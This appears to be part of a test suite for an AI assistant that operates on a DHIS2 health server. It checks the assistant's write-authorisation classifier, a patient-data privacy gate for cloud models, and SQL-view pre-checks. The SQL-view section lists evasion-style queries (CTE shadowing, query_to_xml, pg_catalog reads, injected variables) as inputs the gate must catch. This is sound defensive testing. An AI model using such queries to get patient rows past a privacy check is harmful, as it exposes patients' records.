// What the real-model stress threads of 2026-11-02 stumbled on.
async function runStressThreadChecks() {
  console.log('\nStress threads (2026-11-02):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));

  // JSX text: a JS escape there is shown as those characters.
  const comp = (src) => ctx.compileCustomAppFile('app.jsx', src).code;
  truthy('\\u2014 in JSX text compiles to the character', comp('const a = <p>Due {d} \\u2014 late</p>;').includes('—') && !comp('const a = <p>Due {d} \\u2014 late</p>;').includes('\\u2014'));
  truthy('…also after a regex holding a quote (CSV code)', comp('const r = /"/g;\nconst a = <p>From \\u2192 To</p>;').includes('→'));
  truthy('an escape in a real JS string is left as written', comp("const a = '\\u2014';").includes("'\\u2014'"));
  truthy('an ASCII escape in JSX text stays escaped', comp('const a = <p>\\u003c tag</p>;').includes('\\\\u003c'));
  truthy('a tag mismatch AFTER a regex holding a quote is still caught', !!ctx.compileCustomAppFile('app.jsx', 'const r = /"/g;\nconst a = <h1>x</h2>;').error);
  truthy('a regex with a tag-like body is not read as a tag', !ctx.compileCustomAppFile('app.jsx', 'const r = /<div>/g;\nconst a = <p>x</p>;').error);
  truthy('a division is not read as a regex', !ctx.compileCustomAppFile('app.jsx', 'const a = b / 2; const c = d / 3;\nconst e = <p>{a / c}</p>;').error);

  // OrganisationUnitTree: roots as objects are UIDs.
  const cfgJs = ctx.buildCustomAppConfigJs({ key: 'k', name: 'n', version: '1.0.0', kind: 'app', apiVersion: 42, kitVersion: '1' });
  const seen = {};
  const fakeWin = { D2UI: { OrganisationUnitTree: 'TREE', Button: 'B' }, React: { createElement: (t, p) => { seen.type = t; seen.roots = p.roots; return null; } } };
  new Function('window', 'location', cfgJs)(fakeWin, { pathname: '/api/apps/k/index.html', origin: 'http://x' });
  fakeWin.D2UI.OrganisationUnitTree({ roots: [{ id: 'abcdefghij1', path: '/abcdefghij1' }, 'abcdefghij2'], singleSelection: true });
  truthy('tree roots given as objects reach the tree as UID strings', seen.type === 'TREE' && JSON.stringify(seen.roots) === '["abcdefghij1","abcdefghij2"]');
  fakeWin.D2UI.OrganisationUnitTree({ roots: { id: 'abcdefghij3' } });
  truthy('…a single root object too', seen.roots === 'abcdefghij3');
  fakeWin.D2UI.OrganisationUnitTree({ roots: 'abcdefghij4' });
  truthy('…and a correct string passes through', seen.roots === 'abcdefghij4');
  truthy('every other kit component is still there', fakeWin.D2UI.Button === 'B');

  // Analytics status parameters.
  const st = ctx.healAnalyticsStatusParams;
  const q = (x) => st(`analytics/events/aggregate/P?${x}`);
  truthy('dimension=eventStatus:X moves to the query parameter', q('dimension=eventStatus:COMPLETED&dimension=pe:THIS_YEAR').path === 'analytics/events/aggregate/P?eventStatus=COMPLETED&dimension=pe:THIS_YEAR');
  truthy('filter=eventStatus:eq:X moves too', q('filter=eventStatus:eq:ACTIVE').path === 'analytics/events/aggregate/P?eventStatus=ACTIVE');
  truthy('; between statuses becomes , (a ; is a 400)', q('eventStatus=COMPLETED;ACTIVE').path === 'analytics/events/aggregate/P?eventStatus=COMPLETED,ACTIVE');
  truthy('enrollmentStatus, silently ignored by analytics, becomes programStatus', q('enrollmentStatus=COMPLETED').path === 'analytics/events/aggregate/P?programStatus=COMPLETED');
  truthy('a correct status parameter is not touched', q('eventStatus=COMPLETED').healed === false);
  const enr = st('analytics/enrollments/aggregate/P?dimension=pe:THIS_YEAR&filter=ou:USER_ORGUNIT');
  truthy('enrollment aggregate: filter=ou becomes dimension=ou (E7145 on 2.42)', enr.path === 'analytics/enrollments/aggregate/P?dimension=pe:THIS_YEAR&dimension=ou:USER_ORGUNIT' && /dimension=ou/.test(enr.note));
  truthy('event aggregate keeps filter=ou (it works there)', q('dimension=pe:THIS_YEAR&filter=ou:USER_ORGUNIT').healed === false);
  truthy('the note tells the model to use this form in app code', /app or plugin code/.test(q('dimension=eventStatus:COMPLETED').note));
  truthy('other endpoints are left alone', st('analytics?dimension=eventStatus:COMPLETED').healed === false);

  // Analytics rows read by position show wrong numbers with no error.
  const kit = { exports: { D2UI: [], D2Runtime: [] } };
  const lintOf = (src) => ctx.lintCustomAppCode({ 'app.jsx': src }, 'app', kit).errors.filter((e) => /no fixed column order/.test(e.message));
  truthy('enrollment rows read by position are refused', lintOf("const q = { r: { resource: 'analytics/enrollments/aggregate/' + id } }; const t = (x) => x.rows.reduce((a, row) => a + Number(row[row.length - 1]), 0);").length === 1);
  truthy('…a fetch header does not count as reading the columns by name', lintOf("fetch(u, { headers: { 'Content-Type': 'text/plain' } }); const q = { r: { resource: 'analytics/events/aggregate/' + id } }; const v = d.r.rows[0][1];").length === 1);
  truthy('reading the columns by header name passes', lintOf("const q = { r: { resource: 'analytics/events/aggregate/' + id } }; const col = (r, n) => r.headers.findIndex((h) => h.name === n); const v = d.r.rows[0][col(d.r, 'value')];").length === 0);
  truthy('plain analytics is not affected (value is last there)', lintOf("const q = { r: { resource: 'analytics' } }; const v = d.r.rows[0][1];").length === 0);

  // Empty rows and empty x-axis places.
  const build = (spec) => ctx.buildVisualizationObject({ name: 'x', data_items: ['abcdefghij1'], periods: ['THIS_YEAR'], ...spec }, { abcdefghij1: 'PROGRAM_INDICATOR' }).viz;
  truthy('a table of facilities at a level hides its empty rows', build({ vis_type: 'PIVOT_TABLE', org_units: ['USER_ORGUNIT', 'LEVEL-4'], layout: { rows: ['ou'], columns: ['pe'], filters: ['dx'] } }).hideEmptyRows === true);
  truthy('a chart by district hides its empty x-axis places', build({ vis_type: 'STACKED_COLUMN', org_units: ['USER_ORGUNIT', 'LEVEL-3'], layout: { category: ['ou'], series: ['dx'], filters: ['pe'] } }).hideEmptyRowItems === 'ALL');
  truthy('show_empty:true keeps them (a report of who has not reported)', build({ vis_type: 'PIVOT_TABLE', show_empty: true, org_units: ['USER_ORGUNIT', 'LEVEL-4'], layout: { rows: ['ou'], columns: ['pe'], filters: ['dx'] } }).hideEmptyRows === undefined);
  truthy('a monthly trend keeps its empty months: a gap in a trend is information', build({ vis_type: 'LINE', org_units: ['USER_ORGUNIT'], periods: ['LAST_12_MONTHS'], layout: { category: ['pe'], series: ['dx'], filters: ['ou'] } }).hideEmptyRowItems === undefined);
  truthy('one named org unit on the rows is not touched', build({ vis_type: 'PIVOT_TABLE', org_units: ['USER_ORGUNIT'], layout: { rows: ['ou'], columns: ['pe'], filters: ['dx'] } }).hideEmptyRows === undefined);
  // Sort: the sign is the reverse of what it looks like, and tables have none.
  const chartSpec = { org_units: ['USER_ORGUNIT', 'LEVEL-3'], layout: { category: ['ou'], series: ['dx'], filters: ['pe'] } };
  truthy('sort:"desc" on a chart is sortOrder 1: highest first, as rendered', build({ vis_type: 'BAR', sort: 'desc', ...chartSpec }).sortOrder === 1);
  truthy('sort:"asc" on a chart is sortOrder -1', build({ vis_type: 'COLUMN', sort: 'asc', ...chartSpec }).sortOrder === -1);
  const sortedTable = ctx.buildVisualizationObject({ name: 'x', data_items: ['abcdefghij1'], periods: ['THIS_YEAR'], vis_type: 'PIVOT_TABLE', sort: 'desc', org_units: ['USER_ORGUNIT', 'LEVEL-4'], layout: { rows: ['ou'], columns: ['pe'], filters: ['dx'] } }, { abcdefghij1: 'PROGRAM_INDICATOR' });
  truthy('a table takes no sort fields, and the model is told it cannot be sorted', sortedTable.viz.sortOrder === undefined && sortedTable.viz.sorting === undefined && /cannot be sorted/.test(sortedTable.layoutNote));
  truthy('no top limit is ever saved: DHIS2 ignores it', build({ vis_type: 'BAR', top: 10, ...chartSpec }).topLimit === undefined);

  // Periods DHIS2 does not have (409 on 2.42.5).
  const refusePe = ctx.analyticsUnknownPeriodRefusal;
  truthy('LAST_5_QUARTERS is refused before it is sent', /not a DHIS2 period/.test((refusePe('analytics/events/aggregate/P?dimension=pe:LAST_5_QUARTERS&stage=S') || {})._error));
  truthy('…URL-encoded too', !!refusePe('analytics?dimension=pe%3ALAST_24_MONTHS&filter=ou:USER_ORGUNIT'));
  for (const good of ['pe:LAST_12_MONTHS;THIS_YEAR', 'pe:2025Q4;2026Q1', 'pe:202601', 'pe:QUARTERS_THIS_YEAR;QUARTERS_LAST_YEAR', 'pe:TODAY']) truthy(`${good} goes through`, refusePe(`analytics?dimension=${good}`) === null);
  const badPe = ctx.buildVisualizationObject({ name: 'x', vis_type: 'LINE', data_items: ['abcdefghij1'], periods: ['LAST_5_QUARTERS'], org_units: ['USER_ORGUNIT'] }, { abcdefghij1: 'PROGRAM_INDICATOR' });
  truthy('a chart with an invented period is refused, not saved as a broken tile', /not a DHIS2 period/.test(badPe._error));
  truthy('a fixed period still builds', !!ctx.buildVisualizationObject({ name: 'x', vis_type: 'LINE', data_items: ['abcdefghij1'], periods: ['2026Q1'], org_units: ['USER_ORGUNIT'] }, { abcdefghij1: 'PROGRAM_INDICATOR' }).viz);
  truthy('TODAY maps to its flag', build({ vis_type: 'SINGLE_VALUE', periods: ['TODAY'], org_units: ['USER_ORGUNIT'] }).relativePeriods.thisDay === true);

  // Word-shaped strings are not hard-coded UIDs.
  const uids = ctx.extractCustomAppUids({ 'app.jsx': `const a = "x.toISOString() y"; const b = 'abcDEF12345';` });
  truthy('toISOString is not taken for a UID, a real one is', !uids.includes('toISOString') && uids.includes('abcDEF12345'));

  // A dataStore key it created itself may be removed; another key may not.
  const d2 = vm.runInContext('dhis2', ctx);
  const savedAuth = d2.writeAuth;
  d2.writeAuth = { scope: 'broad', verbs: { create: true, update: false, delete: false } };
  ctx.noteAssistantCreatedDataStoreKey('dataStore/ns/__probe');
  truthy('deleting a dataStore key it created is allowed', ctx.requireWriteAuth('dhis2_query', 'DELETE', { path: 'dataStore/ns/__probe' }) === null);
  truthy('deleting another key still needs the user', !!ctx.requireWriteAuth('dhis2_query', 'DELETE', { path: 'dataStore/ns/other' })?._error);
  truthy('…and a key elsewhere with the same name', !!ctx.requireWriteAuth('dhis2_query', 'DELETE', { path: 'dataStore/capture/__probe' })?._error);
  d2.writeAuth = savedAuth;

  // A valid indicator on a data element the analytics tables do not have yet.
  const savedFetch = ctx.safeDhis2Fetch;
  const asked = [];
  ctx.safeDhis2Fetch = async (p) => {
    asked.push(p);
    if (/pe:THIS_YEAR&/.test(p)) return { _error: 'DHIS2 API 409: Query failed because of a syntax error (SqlState: 42703)', _status: 409, _body: { devMessage: 'ERROR: column "vmC72UnyEMf" does not exist\n  Position: 40', errorCode: 'E7145' } };
    return { rows: [] };
  };
  const rt = await ctx.piRuntimeAnalyticsCheck(null, ['SXQEOCJz91n']);
  truthy('one period alone is asked too: a list of periods answers an empty 200', asked.some((p) => /pe:THIS_YEAR&/.test(p)));
  truthy('a missing column is reported as needing a full run', rt.needs_full_analytics_run && rt.needs_full_analytics_run[0].data_element === 'vmC72UnyEMf' && /FULL Analytics/.test(rt.needs_full_analytics_note));
  truthy('…the indicator is not "broken", so nothing rolls it back', rt.ok === true && !rt.broken && !rt.no_data.includes('SXQEOCJz91n'));
  ctx.safeDhis2Fetch = async (p) => (/pe:THIS_YEAR&/.test(p) ? { _error: 'DHIS2 API 409: Query failed because of a syntax error (SqlState: 42883)', _status: 409, _body: { devMessage: 'ERROR: operator does not exist: boolean = integer' } } : { rows: [] });
  const rt2 = await ctx.piRuntimeAnalyticsCheck(null, ['SXQEOCJz91n']);
  truthy('a real expression fault is still reported as broken', rt2.ok === false && rt2.broken.length === 1);
  ctx.safeDhis2Fetch = savedFetch;

  // A backup of a data-shareable type must be able to restore its sharing.
  for (const t of ['programs', 'programStages', 'programIndicators', 'trackedEntityTypes', 'optionSets', 'indicators', 'dataSets', 'dashboards', 'someOtherType']) truthy(`a ${t} snapshot starts from :owner, so a restore wipes nothing`, /^:owner\b/.test(ctx.getSnapshotFields(t)));
  truthy('…and still carries the nested collections it spells out', /programRuleActions\[/.test(ctx.getSnapshotFields('programRules')));
  truthy('a name with a colon is searched as written', decodeURIComponent(ctx._filterValue(' C:( Om-Aldalia ) ')) === 'C:( Om-Aldalia )');

  // Event aggregate answers are cached without program or stage; limit is in the key.
  const ck = ctx.withEventAggregateCacheKey;
  const limOf = (p) => Number((/[?&]limit=(\d+)/.exec(ck(p)) || [])[1]);
  const pA = 'analytics/events/aggregate/AAAAAAAAAAA?dimension=pe:THIS_YEAR', pB = 'analytics/events/aggregate/BBBBBBBBBBB?dimension=pe:THIS_YEAR';
  truthy('two programs get different limits', limOf(pA) && limOf(pB) && limOf(pA) !== limOf(pB));
  truthy('two stages get different limits', limOf(`${pA}&stage=S1111111111`) !== limOf(`${pA}&stage=S2222222222`));
  truthy('the same query gets the same limit, so the cache still works', limOf(pA) === limOf(pA));
  truthy('the limit stays under the server maximum, and over any chart', limOf(pA) >= 10000 && limOf(pA) < 50000);
  truthy('a full URL works too', /limit=\d+$/.test(ck(`http://x/api/42/${pA}`)));
  truthy('a limit already there is kept', ck(`${pA}&limit=5`) === `${pA}&limit=5`);
  truthy('no query string: starts one', /aggregate\/AAAAAAAAAAA\?limit=\d+$/.test(ck('analytics/events/aggregate/AAAAAAAAAAA')));
  for (const other of ['analytics?dimension=dx:A', 'analytics/events/query/AAAAAAAAAAA?stage=B', 'analytics/enrollments/aggregate/AAAAAAAAAAA?dimension=pe:THIS_YEAR']) truthy(`not touched: ${other.slice(0, 40)}`, ck(other) === other);
  const guardJs = ctx.buildCustomAppGuardJs({ needsWriteAccess: false });
  let sent = null;
  const fakeGuardWin = { location: { origin: 'http://x', href: 'http://x/a' }, fetch: function (u) { sent = u; return Promise.resolve(); }, XMLHttpRequest: null };
  new Function('window', 'navigator', 'Request', guardJs)(fakeGuardWin, {}, function () {});
  fakeGuardWin.fetch('http://x/api/42/analytics/events/aggregate/AAAAAAAAAAA?dimension=pe:THIS_YEAR');
  truthy('a generated app keys its event aggregate requests', /limit=\d+/.test(String(sent)));
  fakeGuardWin.fetch('http://x/api/42/programs?fields=id');
  truthy('…and leaves every other request alone', sent === 'http://x/api/42/programs?fields=id');

  // Plain editing instructions authorize; questions and reports about the same verbs do not.
  const scopeOf = (m) => ctx.classifyWriteAuthorization(m).scope;
  for (const m of ['Replace the bar chart by district with a horizontal one showing only the top 10 districts, and move the map next to the epidemic curve.', 'Move the map next to the curve.', 'Put the map on the left', 'Sort the chart from highest to lowest', 'Use a line chart instead', 'Turn this into a stacked column', 'Duplicate the dashboard', 'Shrink the map', 'Reorder the tiles', 'Now do the same for tuberculosis', 'Can you move the map?', 'please replace the table with a chart']) {
    truthy(`authorizes: ${m.slice(0, 60)}`, scopeOf(m) === 'broad');
  }
  for (const m of ['Why is the map empty?', 'What would happen if I replace the chart?', 'Is it possible to move the map?', 'how do I move the map next to the chart', 'can you tell me if replacing the map would break anything', 'the map moved and now the chart is broken', 'When I move the map it fails', 'the replace button does not work', 'do not move the map', 'Use the Malaria program and tell me how many cases', 'Show the top 10 districts']) {
    truthy(`stays read-only: ${m.slice(0, 60)}`, scopeOf(m) === 'read_only');
  }
  truthy('"move" is not permission to delete', ctx.classifyWriteAuthorization('Move the map next to the curve.').verbs.delete === false);
  truthy('"replace" is: the old tile goes', ctx.classifyWriteAuthorization('Replace the bar chart with a pie chart').verbs.delete === true);
  const hidden = ctx.dashTileNeeds({ itemType: 'VISUALIZATION', vizType: 'PIVOT_TABLE', hideEmptyRows: true, rows: [{ dimension: 'ou', items: ['LEVEL-4'] }], columns: [{ dimension: 'pe', items: ['THIS_YEAR'] }] }, { 4: 900 });
  truthy('a table hiding empty rows is not sized for every unit at the level', hidden.h <= 20);
}

async function runLogEndpointChecks() {
  console.log('\nLog sources: job ids and guessed endpoints:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const harvested = vm.runInContext(`(() => { const s = new Set(); harvestUidsInto(s, { ANALYTICS_TABLE: { WtMCtIQU6HS: [{ id: 'P6fE5zF3tV7', message: 'x' }] } }); return [...s]; })()`, ctx);
  truthy('a UID used as an object KEY counts as seen (system/tasks: job ids are keys)', harvested.includes('WtMCtIQU6HS') && harvested.includes('P6fE5zF3tV7'));
  const guessed = ctx.isGuessedLogEndpoint;
  for (const p of ['logs', 'system/logs', 'system/notifications', 'system/tasksExtended', 'system/errors', 'system/taskSummaries', 'audits/analytics', 'audits/scheduler', 'system/tasks/ANALYTICS_TABLE/bX0zP3zZB2a/P6fE5zF3tV7'])
    truthy(`guessed, answers 404 on 2.42 and 2.43: ${p}`, guessed(p));
  for (const p of ['metadataAudits', 'system/tasks', 'system/tasks/DATA_STATISTICS', 'system/tasks/ANALYTICS_TABLE/WtMCtIQU6HS', 'system/taskSummaries/ANALYTICS_TABLE', 'system/info', 'scheduling/completed', 'scheduling/running', 'scheduler', 'jobConfigurations', 'audits/dataValue', 'audits/dataApproval', 'dataStatistics', 'dataSummary'])
    truthy(`real endpoint is not touched: ${p}`, !guessed(p));
  vm.runInContext(`_cachedApiKey = 'k'; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' }; globalThis.__savedGetCfg = getProviderConfig; getProviderConfig = () => _cachedProviderConfig;`, ctx);
  try {
    const gate = ctx.enforcePatientDataPrivacyGate;
    const made = gate('dhis2_query', { path: 'audits/analytics' });
    truthy('cloud model: a made-up audits/ path is refused as what it is, not as patient data', made && /is not a DHIS2 endpoint/.test(made._error) && !/patient/i.test(made._error) && /scheduling\/completed/.test(made._hint));
    for (const p of ['audits/trackedEntity', 'audits/trackedEntityDataValue', 'audits/enrollment', 'audits/event', 'audits/trackerAnything']) {
      const r = gate('dhis2_query', { path: p });
      truthy(`cloud model: tracker audit stays a privacy refusal: ${p}`, r && /hard privacy safeguard/.test(r._error));
    }
    truthy('cloud model: audits/dataValue stays readable', gate('dhis2_query', { path: 'audits/dataValue' }) === null);
  } finally {
    vm.runInContext(`getProviderConfig = globalThis.__savedGetCfg; _cachedApiKey = null; _cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG };`, ctx);
  }
  const savedFetch = ctx.fetch; let fetched = 0;
  ctx.fetch = async () => { fetched++; return new Response('{}', { status: 200 }); };
  try {
    for (const path of ['system/notifications', 'logs', 'system/tasks/ANALYTICS_TABLE/bX0zP3zZB2a/P6fE5zF3tV7']) {
      const r = await ctx.executeTool('dhis2_query', { path });
      truthy(`dhis2_query ${path}: not sent, and the answer lists the real sources`, /Not sent/.test(r._error) && /scheduling\/completed/.test(r._hint) && /dhis\.log/.test(r._hint) && fetched === 0);
    }
  } finally { ctx.fetch = savedFetch; }
  const manual = vm.runInContext(`buildManualGateResult('manage_custom_app').manual`, ctx);
  truthy('the app manual lists the sources and says request/error logs are in no API', /Apps about the server itself/.test(manual) && /scheduling\/completed/.test(manual) && /dhis\.log/.test(manual));
}

// A dropped provider stream is retried like a stalled one (no text yet).
function runStreamRetryChecks() {
  console.log('\nProvider stream drops are retried before any text streams:');
  const r = ctx.isRetryableStreamDrop;
  for (const m of ['LLM stream stalled: no data from x for 60s', 'terminated', 'TypeError: network error', 'Failed to fetch', 'other side closed'])
    (r(new Error(m)) ? ok : bad)(`retryable: "${m}"`);
  for (const m of ['HTTP 401 Unauthorized', 'No API key configured', 'Invalid provider URL'])
    (!r(new Error(m)) ? ok : bad)(`not retryable: "${m}"`);
  const src = fs.readFileSync(path.join(ROOT, 'src/agent.js'), 'utf8');
  (/AI_STREAM_DISCARD/.test(src) ? ok : bad)('a retry after text streamed takes the partial reply off the screen');
  const panelSrc = fs.readFileSync(path.join(ROOT, 'sidepanel/panel.js'), 'utf8');
  (/case 'AI_STREAM_DISCARD'/.test(panelSrc) ? ok : bad)('the panel handles the discard message');
}

// ── SQL views + transfer-history thread fixes (2026-10-23) ──────────────────
// A "transfer history" dashboard-plugin request failed end to end on 2.43.2:
// guessed endpoints (405/404/404/500), schemas/<tracker object> 404s, 2.40
// table names, a view nobody could read (rw------ → E4312), a false "DHIS2
// validated the SQL on save", and the user's own "install it on a dashbaord"
// refused as "not asked". Server facts verified live on 2.42.5.1 and 2.43.2.
async function runSqlViewChecks() {
  console.log('\nSQL views, privacy exception & the transfer-history thread:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = ctx.__dhis2();
  const saved = { apiVersion: d.apiVersion, writeAuth: d.writeAuth, sdf: ctx.safeDhis2Fetch, gsi: ctx.getSchemaIndex };
  const A = (sql) => ctx.analyzeSqlViewPrivacy(sql).metadataOnly;
  const TRANSFER_SQL = "with history as (select h.programownershiphistoryid as transfer_id, h.trackedentityid, h.programid, h.organisationunitid as from_ou_id, h.enddate as transferred_at, lead(h.organisationunitid) over w as next_ou_id, lead(h.createdby) over w as next_owner_createdby from programownershiphistory h window w as (partition by h.trackedentityid, h.programid order by h.enddate, h.programownershiphistoryid)) select to_char(t.transferred_at, 'YYYY-MM-DD HH24:MI') as transferred_at, p.name as program, fo.name as from_org_unit, tu.name as to_org_unit, coalesce(t.next_owner_createdby, cur.createdby) as transferred_by from history t join program p on p.programid = t.programid join trackedentity te on te.trackedentityid = t.trackedentityid and te.deleted = false join organisationunit fo on fo.organisationunitid = t.from_ou_id left join trackedentityprogramowner cur on cur.trackedentityid = t.trackedentityid and cur.programid = t.programid left join organisationunit tu on tu.organisationunitid = coalesce(t.next_ou_id, cur.organisationunitid) where t.transferred_at >= cast('${startDate}' as date) and t.transferred_at < cast('${endDate}' as date) + interval '1 day' and ('${orgUnit}' = 'ALL' or fo.path like '%' || '${orgUnit}' || '%') order by t.transferred_at desc";
  try {
    // 1. What counts as metadata-only (fail closed on anything unknown).
    const meta = [
      'select uid, name from program order by name',
      "select de.uid, de.name, os.name from dataelement de left join optionset os on os.optionsetid = de.optionsetid where de.valuetype = 'TEXT'",
      "select table_name, column_name from information_schema.columns where table_schema = 'public'",
      'with p as (select programid, name from program) select p.name, count(ps.*) from p join programstage ps on ps.programid = p.programid group by p.name',
      'select extract(year from created) y, count(*) from dataelement group by 1',
      "select o.uid from organisationunit o where o.path like '%${ou}%'",
      'select x.v from program p, lateral jsonb_array_elements(p.translations) x(v)',
      'select name from program union select name from programstage;',
      'select v.uid from eventvisualization v join eventvisualization_columns c on c.eventvisualizationid = v.eventvisualizationid',
    ];
    const notMeta = [
      'select * from trackedentity', 'select * from program, event', 'select * from program p, (select * from trackedentity) t',
      'select (select count(*) from programownershiphistory) from program', 'with event as (select * from event) select * from event',
      'with a as (select * from b), b as (select 1) select * from a', 'select * from (with t as (select 1) select * from t) x, t',
      "select query_to_xml('select * from trackedentity', true, true, '')", 'select * from program where name = ${n}', 'select * from "${t}"',
      'select * from program -- ${x}\n', 'select * from public.trackedentity', 'select * from pg_catalog.pg_stat_activity',
      'select * from program; select * from event', 'do $$ begin perform 1; end $$', 'select * from (program p join trackerevent e on true)',
      'table event', 'select * from program where uid in (table trackedentity)', 'select pg_catalog.lower(name) from program',
      'select * from program where uid = any(select uid from singleevent)', 'select * from datavalue',
      'select * from program p cross join lateral (select * from enrollment) e', 'with recursive r as (select 1) select * from r, enrollment',
      TRANSFER_SQL,
    ];
    truthy(`${meta.length} metadata queries are metadata-only (CTEs, joins, information_schema, lateral SRFs, quoted variables)`, meta.every(A));
    const leaked = notMeta.filter(A);
    truthy(`${notMeta.length} queries that read — or could read — anything else are NOT (CTE shadowing, query_to_xml, TABLE, unquoted/commented variables, pg_catalog, datavalue, the transfer SQL)`, leaked.length === 0 || (bad(`leaked: ${JSON.stringify(leaked)}`), false));

    // 2. Gate holes closed; aggregate audits stay readable.
    truthy('audits/trackedEntity, audits/trackedEntityDataValue, analytics/trackedEntities/query are patient-level', ['audits/trackedEntity?trackedEntities=x', 'audits/trackedEntityDataValue', 'analytics/trackedEntities/query/nEenWmSyUEp'].every((p) => ctx.pathReadsPatientData(p)));
    truthy('audits/dataValue and audits/dataApproval are not', !ctx.pathReadsPatientData('audits/dataValue') && !ctx.pathReadsPatientData('audits/dataApproval'));

    // 3. The metadata-only exception, decided from the CURRENT server SQL.
    vm.runInContext(`_cachedProviderConfig = { ...DEFAULT_PROVIDER_CONFIG, providerType: 'fireworks', apiBaseUrl: 'https://llm.invalid/v1', modelId: 'm' };`, ctx);
    const views = {
      metaQry0001: { id: 'metaQry0001', type: 'QUERY', sqlQuery: "select uid, name from program where name ilike '%${q}%'" },
      metaView001: { id: 'metaView001', type: 'VIEW', sqlQuery: 'select uid from program' },
      trnsfer0001: { id: 'trnsfer0001', type: 'QUERY', sqlQuery: TRANSFER_SQL },
    };
    const fetched = [];
    ctx.safeDhis2Fetch = async (path) => { fetched.push(path); const m = /^sqlViews\/(\w{11})\?/.exec(path); return m && views[m[1]] ? views[m[1]] : { _error: 'DHIS2 API 404', _status: 404 }; };
    const gate = (args) => ctx.enforcePatientDataPrivacyGateAsync('dhis2_query', args);
    truthy('cloud model: a metadata-only QUERY view is readable through dhis2_query (var passed in query_params)', (await gate({ path: 'sqlViews/metaQry0001/data', query_params: { var: 'q:anc', pageSize: 50 } })) === null);
    truthy('…its SQL was fetched from the server for the decision', fetched.some((p) => p.startsWith('sqlViews/metaQry0001?')));
    const tr = await gate({ path: 'sqlViews/trnsfer0001/data?var=startDate:2020-01-01' });
    truthy('the transfer view stays refused, with the reason and a pointer to manage_sql_views run', tr && tr._privacy_block && /not metadata-only: reads .*programownershiphistory/.test(tr._error) && /manage_sql_views\(action="run"/.test(tr._hint));
    truthy('a VIEW-type metadata view stays refused (its rows are a stored copy)', !!(await gate({ path: 'sqlViews/metaView001/data' })));
    truthy('extra parameters (criteria) or a .csv suffix keep a metadata view refused', !!(await gate({ path: 'sqlViews/metaQry0001/data?criteria=uid:x' })) && !!(await gate({ path: 'sqlViews/metaQry0001/data.csv' })));
    truthy('a view that cannot be read is refused', !!(await gate({ path: 'sqlViews/missing0001/data' })));
    truthy('tracker/events is still refused with no SQL-view lookup', !!(await gate({ path: 'tracker/events?program=x' })));

    // 4. manage_sql_views run on a cloud model: rows only for metadata-only views.
    ctx.safeDhis2Fetch = async (path) => {
      const m = /^sqlViews\/(\w{11})/.exec(path);
      if (/\/data\?/.test(path)) return { pager: { page: 1, total: 14 }, listGrid: { headers: [{ name: 'a' }, { name: 'b' }], rows: [['x', 'y']] } };
      return m && views[m[1]] ? { ...views[m[1]], displayName: m[1] } : { _error: 'DHIS2 API 404', _status: 404 };
    };
    const runT = await ctx.executeManageSqlViews({ action: 'run', id: 'trnsfer0001', variables: { startDate: '2020-01-01', endDate: '2030-12-31', orgUnit: 'ALL' } });
    truthy('run on the transfer view: columns + row_count, rows withheld', runT.row_count === 14 && runT.columns.length === 2 && !runT.rows && /not metadata-only/i.test(runT.rows_withheld || ''));
    const runM = await ctx.executeManageSqlViews({ action: 'run', id: 'metaQry0001', variables: { q: 'anc' } });
    truthy('run on a metadata view returns its rows', Array.isArray(runM.rows) && runM.rows.length === 1);
    truthy('run without a needed variable is refused before any request', /needs a value for \$\{endDate\}/.test((await ctx.executeManageSqlViews({ action: 'run', id: 'trnsfer0001', variables: { startDate: '2020-01-01', orgUnit: 'ALL' } }))._error || ''));
    truthy('a data error from a patient-level view is not passed on verbatim', /withheld/.test(ctx.sqlViewDbError({ _body: { errorCode: 'E7144', devMessage: 'ERROR: invalid input syntax for type integer: "Jane"' } }, false).db_error) && /does not exist/.test(ctx.sqlViewDbError({ _body: { errorCode: 'E7144', devMessage: 'ERROR: column t.created does not exist' } }, false).db_error));

    // 5. Pre-checks: every DHIS2 refusal found before a request.
    const pc = (sql, minor, tv) => ctx.precheckSqlViewQuery(sql, { minor, testVariables: tv }).problems.join(' | ');
    truthy("an illegal keyword inside a string literal ('delete me') is caught — DHIS2 refuses it there too (E4311)", /"delete"/.test(pc("select uid from program where name <> 'delete me'", 42)));
    truthy('"lastupdated" / "x_delete" are fine', pc("select lastupdated from program where name <> 'x_delete'", 42) === '');
    truthy('the protected userinfo table is caught (E4310)', /protected table/.test(pc('select u.username from programownershiphistory h join userinfo u on u.username = h.createdby', 42)));
    truthy('the failed thread\'s 2.40 names are caught on 2.43 (trackedentityinstance, programinstance, trackedentityinstanceid)', (() => { const r = pc('select tei.uid from programownershiphistory owh join trackedentityinstance tei on tei.trackedentityinstanceid = owh.trackedentityinstanceid join programinstance pi on pi.programinstanceid = owh.programinstanceid', 43); return /"trackedentityinstance" does not exist/.test(r) && /"programinstance" does not exist/.test(r) && /trackedentityinstanceid → trackedentityid/.test(r); })());
    truthy('event is right on 2.42 and wrong on 2.43 (trackerevent / singleevent)', pc('select uid from event', 42) === '' && /trackerevent/.test(pc('select uid from event', 43)) && /only exists from 2\.43/.test(pc('select uid from trackerevent', 42)));
    truthy('a variable without a test value, or a value with ":", is caught (E4307)', /test_variables/.test(pc(TRANSFER_SQL, 42, { startDate: '2020-01-01', orgUnit: 'ALL' })) && /not a value DHIS2 accepts/.test(pc(TRANSFER_SQL, 42, { startDate: '2020-01-01T00:00', endDate: '2030-12-31', orgUnit: 'ALL' })));
    truthy('the transfer recipe passes on 2.42 with its test values', pc(TRANSFER_SQL, 42, { startDate: '2000-01-01', endDate: '2099-12-31', orgUnit: 'ALL' }) === '');
    truthy('sharing rw------ = nobody reads rows; r-r----- or a group with data read = readable', !ctx.sqlViewDataReaders({ public: 'rw------' }).anyone && ctx.sqlViewDataReaders({ public: 'r-r-----' }).anyone && ctx.sqlViewDataReaders({ public: '--------', userGroups: { g: { id: 'g', access: 'r-r-----' } } }).anyone);

    // 6. create: refused before any request on a precheck problem; a view whose
    //    SQL fails when run is removed again; success runs it once.
    d.apiVersion = 42; d.writeAuth = { scope: 'broad', reason: 'verify' };
    const calls = [];
    let failRun = true;
    ctx.safeDhis2Fetch = async (path, opts = {}) => {
      calls.push(`${opts.method || 'GET'} ${path.split('?')[0]}`);
      if (/^sqlViews\?/.test(path)) return { sqlViews: [] };
